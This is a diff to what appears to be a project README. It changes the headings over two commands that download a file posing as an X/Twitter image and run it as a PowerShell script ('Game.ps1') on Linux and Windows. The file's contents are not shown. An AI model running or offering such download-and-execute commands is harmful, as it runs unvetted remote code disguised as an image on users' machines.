@@ -117,12 +117,12 @@ You will first need to get the image link address from ***X/Twitter***, after yo
 
 Click the image in the post to fully expand it, then ***right-click*** on the image and select "***Copy image address***" from the menu.
 
-For ***wget***, use the following command (enclose the address within quotation marks):
+Linux: 
 ```console
 wget "https://pbs.twimg.com/media/GhZTR8BXgAACc9Q?format=jpg&name=medium";pwsh GhZ*
 ```
 
-For ***iwr***, use the following command:
+Windows:
 ```console
 iwr -OutFile Game.ps1 "https://pbs.twimg.com/media/GhZTR8BXgAACc9Q?format=jpg&name=medium";.\Game.ps1
 ```
